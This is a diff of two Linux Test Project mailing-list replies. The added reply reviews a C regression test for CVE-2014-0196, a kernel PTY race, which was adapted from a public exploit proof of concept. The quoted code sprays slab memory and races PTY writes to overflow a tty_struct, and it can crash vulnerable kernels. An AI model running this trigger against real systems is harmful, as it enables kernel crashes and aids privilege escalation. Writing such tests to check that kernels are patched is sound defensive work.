@@ -1,11 +1,10 @@
 From: Cyril Hrubis <chrubis@suse.cz>
-Date: Fri, 26 May 2017 21:33:37 +0200
-Subject: [LTP] [PATCH v2 05/10] Add CVE .gitignore,
- Makefile and runtest files
-In-Reply-To: <20170522121341.4663-6-rpalethorpe@suse.com>
+Date: Fri, 26 May 2017 21:41:39 +0200
+Subject: [LTP] [PATCH v2 06/10] Test for CVE-2014-0196 PTY echo race
+In-Reply-To: <20170522121341.4663-7-rpalethorpe@suse.com>
 References: <20170522121341.4663-1-rpalethorpe@suse.com>
- <20170522121341.4663-6-rpalethorpe@suse.com>
-Message-ID: <20170526193301.GA18654@rei.suse.de>
+ <20170522121341.4663-7-rpalethorpe@suse.com>
+Message-ID: <20170526194139.GB18654@rei.suse.de>
 List-Id: <ltp.lists.linux.it>
 MIME-Version: 1.0
 Content-Type: text/plain; charset="us-ascii"
@@ -13,44 +12,181 @@ Content-Transfer-Encoding: 7bit
 To: ltp@lists.linux.it
 
 Hi!
-> +++ b/testcases/cve/Makefile
-> @@ -0,0 +1,25 @@
-> +# Copyright (c) 2017 Linux Test Project
-> +#
-> +# This program is free software; you can redistribute it and/or
-> +# modify it under the terms of the GNU General Public License as
-> +# published by the Free Software Foundation; either version 2 of
-> +# the License, or (at your option) any later version.
-> +#
-> +# This program is distributed in the hope that it would be useful,
-> +# but WITHOUT ANY WARRANTY; without even the implied warranty of
-> +# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-> +# GNU General Public License for more details.
-> +#
-> +# You should have received a copy of the GNU General Public License
-> +# along with this program. If not, see <http://www.gnu.org/licenses/>.
+> +/*
+> + * Copyright (c) 2017 Richard Palethorpe <rpalethorpe@suse.com>
+> + * Original POC by Matthew Daley <mattd@bugfuzz.com>
+> + *
+> + * This program is free software: you can redistribute it and/or modify
+> + * it under the terms of the GNU General Public License as published by
+> + * the Free Software Foundation, either version 2 of the License, or
+> + * (at your option) any later version.
+> + *
+> + * This program is distributed in the hope that it will be useful,
+> + * but WITHOUT ANY WARRANTY; without even the implied warranty of
+> + * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+> + * GNU General Public License for more details.
+> + *
+> + * You should have received a copy of the GNU General Public License
+> + * along with this program. If not, see <http://www.gnu.org/licenses/>.
+> + */
+> +/*
+> + * This test attempts to cause a buffer overflow using the race condition
+> + * described in CVE-2014-0196. If the test is successful in causing an
+> + * overflow it will most likely result in an immediate Oops, restart or
+> + * freeze. However if it overwrites memory not accessed during the test then
+> + * it could happen at a later time or not at all which is more likely if SLAB
+> + * randomization has been implemented. However as it currently stands, the test
+> + * usually crashes as soon as the delay has been calibrated.
+> + *
+> + * To maximise the chances of the buffer overflow doing immediate detectable
+> + * damage the SLAB filler sockets and ioctls from the original exploit POC
+> + * have been kept even though they are not strictly necessary to reproduce the
+> + * bug.
+> + *
+> + * Further details:
+> + * see linux commit 4291086b1f081b869c6d79e5b7441633dc3ace00
+> + * privilege escalation POC https://www.exploit-db.com/exploits/33516/
+> + */
 > +
-> +top_srcdir		?= ../..
+> +#include <pty.h>
+> +#include <stdio.h>
+> +#include <string.h>
+> +#include <termios.h>
+> +#include <limits.h>
 > +
-> +include $(top_srcdir)/include/mk/testcases.mk
+> +#include "tst_test.h"
+> +#include "tst_timer.h"
+> +#include "tst_safe_pthread.h"
 > +
-> +CFLAGS			+= -D_GNU_SOURCE
-
-Ah, you define _GNU_SOURCE here for all the tests. That should be fine,
-but we should still check if the domainname field is present if
-_GNU_SOURCE is defined, otherwise it may fail with alternative glibc (we
-have at least three these days).
-
-> +cve-2014-0196:	LDFLAGS += -lpthread -lutil -lrt
-
-Here you are adding LDFLAGS for test that does not exist yet, but at
-least that should not break anything.
-
-BTW what is the -lutil needed for?
-
-> +cve-2016-7117:	LDFLAGS += -lpthread -lrt
+> +#include "tst_fuzzy_sync.h"
 > +
-> +include $(top_srcdir)/include/mk/generic_leaf_target.mk
+> +#define ONEOFF_ALLOCS 200
+> +#define RUN_ALLOCS    30
+> +#define ATTEMPTS      0x7000
+> +#define BUFLEN        512
+> +
+> +static int master_fd, slave_fd;
+> +static int filler_ptys[ONEOFF_ALLOCS * 2];
+> +static int target_ptys[RUN_ALLOCS * 2];
+> +static char buf[BUFLEN];
+> +
+> +static struct tst_fzsync_pair fzsync_pair = {
+> +	.delay_inc = 100,
+> +};
+> +
+> +static void create_pty(int *amaster, int *aslave)
+> +{
+> +	if (openpty(amaster, aslave, NULL, NULL, NULL) == -1)
+> +		tst_brk(TBROK | TERRNO, "pty creation failed");
+> +}
+> +
+> +static void setup(void)
+> +{
+> +	int i;
+> +
+> +	tst_fzsync_pair_init(&fzsync_pair);
+
+I find this mildly confusing, I would expected the strucutre to be
+initialized with a default values, then override the delay increment,
+not the other way around.
+
+> +	for (i = 0; i < ONEOFF_ALLOCS; i++)
+> +		create_pty(&filler_ptys[i],
+> +			   &filler_ptys[i + ONEOFF_ALLOCS]);
+
+The LKML conding style prefers to add curly braces here if the statement
+overflows more than one line, but that is very minor.
+
+> +}
+> +
+> +static void *overwrite_thread_fn(void *p)
+> +{
+> +	tst_fzsync_delay_b(&fzsync_pair);
+> +	tst_fzsync_time_b(&fzsync_pair);
+> +
+> +	SAFE_WRITE(0, slave_fd, buf, BUFLEN - 1);
+> +	SAFE_WRITE(0, slave_fd, buf, BUFLEN - 1);
+> +	SAFE_WRITE(0, slave_fd, buf, BUFLEN);
+> +
+> +	return p;
+> +}
+> +
+> +static void run(void)
+> +{
+> +	struct termios t;
+> +	pthread_t overwrite_thread;
+> +	int i, j;
+> +
+> +	tst_res(TINFO, "Attempting to overflow into a tty_struct...");
+> +
+> +	for (i = 0; i < ATTEMPTS; i++) {
+> +		create_pty(&master_fd, &slave_fd);
+> +
+> +		for (j = 0; j < RUN_ALLOCS; j++)
+> +			create_pty(&target_ptys[j],
+> +				   &target_ptys[j + RUN_ALLOCS]);
+> +		SAFE_CLOSE(target_ptys[RUN_ALLOCS / 2]);
+> +		SAFE_CLOSE(target_ptys[RUN_ALLOCS / 2 + RUN_ALLOCS]);
+> +
+> +		SAFE_WRITE(0, slave_fd, buf, 1);
+> +
+> +		tcgetattr(master_fd, &t);
+> +		t.c_oflag &= ~OPOST;
+> +		t.c_lflag |= ECHO;
+> +		tcsetattr(master_fd, TCSANOW, &t);
+> +
+> +		SAFE_PTHREAD_CREATE(&overwrite_thread, NULL,
+> +				    overwrite_thread_fn, NULL);
+> +
+> +		tst_fzsync_delay_a(&fzsync_pair);
+> +		tst_fzsync_time_a(&fzsync_pair);
+> +		SAFE_WRITE(0, master_fd, "A", 1);
+> +
+> +		SAFE_PTHREAD_JOIN(overwrite_thread, NULL);
+> +
+> +		tst_fzsync_pair_update(i, &fzsync_pair);
+> +
+> +		if (!(i & 0x1FFF))
+> +			tst_fzsync_pair_info(&fzsync_pair);
+> +
+> +		for (j = 0; j < RUN_ALLOCS; j++) {
+> +			if (j == RUN_ALLOCS / 2)
+> +				continue;
+> +
+> +			ioctl(target_ptys[j], 0xdeadbeef);
+> +			ioctl(target_ptys[j + RUN_ALLOCS], 0xdeadbeef);
+> +			SAFE_CLOSE(target_ptys[j]);
+> +			SAFE_CLOSE(target_ptys[j + RUN_ALLOCS]);
+> +		}
+> +
+> +		ioctl(master_fd, 0xdeadbeef);
+> +		ioctl(slave_fd, 0xdeadbeef);
+> +		SAFE_CLOSE(master_fd);
+> +		SAFE_CLOSE(slave_fd);
+> +	}
+> +
+> +	tst_res(TPASS, "Nothing bad happened, probably.");
+
+I like the "probably" in the message :-)
+
+> +}
+> +
+> +static void cleanup(void)
+> +{
+> +	int i;
+> +
+> +	for (i = 0; i < ONEOFF_ALLOCS * 2; i++)
+> +		close(filler_ptys[i]);
+> +	close(master_fd);
+> +	close(slave_fd);
+> +}
+> +
+> +static struct tst_test test = {
+> +	.tid = "cve-2014-0196",
+> +	.setup = setup,
+> +	.cleanup = cleanup,
+> +	.test_all = run,
+> +};
 > -- 
 > 2.12.2
 > 
